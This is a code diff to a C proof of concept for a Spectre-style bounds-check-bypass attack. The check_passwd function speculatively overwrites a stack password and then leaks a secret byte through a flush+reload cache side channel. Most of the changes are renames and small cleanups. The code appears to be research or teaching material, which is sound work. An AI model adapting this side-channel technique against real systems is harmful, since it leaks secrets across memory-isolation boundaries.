@@ -24,9 +24,9 @@ int buf_size __attribute__ ((aligned (256))) = BUF_SIZE;
 
 /*
  * Variables required in cache:
- *  user_idx
+ *  user_id
  *  user_char
- *  user_passwd
+ *  user_password
  *  BUF
  *  PASSWORD
  *  SECRET
@@ -34,22 +34,21 @@ int buf_size __attribute__ ((aligned (256))) = BUF_SIZE;
  * Variables required in mem:
  *  buf_size
  */
-void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* flush_reload_arr, int secret_index) {
+void check_passwd(int user_id, char user_char, char user_password, cp_t* flush_reload_arr, int secret_index) {
 
-    buf_size = BUF_SIZE;
     stack.PASSWORD = "x";
 
     cpuid();
-    flush((void*)&buf_size);
+    flush(&buf_size);
     cpuid();
 
     //bounds check should prevent overwrite. But speculatively executes
-    if (user_idx < buf_size) {
-        stack.BUF[user_idx] = user_char;
+    if (user_id < buf_size) {
+        stack.BUF[user_id] = user_char;
     }
 
     //PASSWORD has been (speculatively) overwritten with user_char.
-    if (user_passwd == stack.PASSWORD[0]) {
+    if (user_password == stack.PASSWORD[0]) {
         volatile cp_t cp = flush_reload_arr[SECRET[secret_index]];
     }
 }
@@ -57,7 +56,7 @@ void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* flush_re
 int* prepare(int secret_index) {
 
     cp_t* flush_reload_arr = init_flush_reload(N_PAGES);
-    flush_arr((void*)flush_reload_arr, N_PAGES);
+    flush_arr(flush_reload_arr, N_PAGES);
 
     //access decisions in array, repeated out-of-bounds not traceable for branch predictor
     int n_accesses =   N_TRAINING + 1;
@@ -84,7 +83,7 @@ int* prepare(int secret_index) {
 
         //flush hits from training phase (all but last access)
         if(i < n_accesses-1) {
-            asm volatile ("cpuid\n":::);
+            cpuid();
             flush_arr(flush_reload_arr, N_PAGES);
         }
         cpuid();
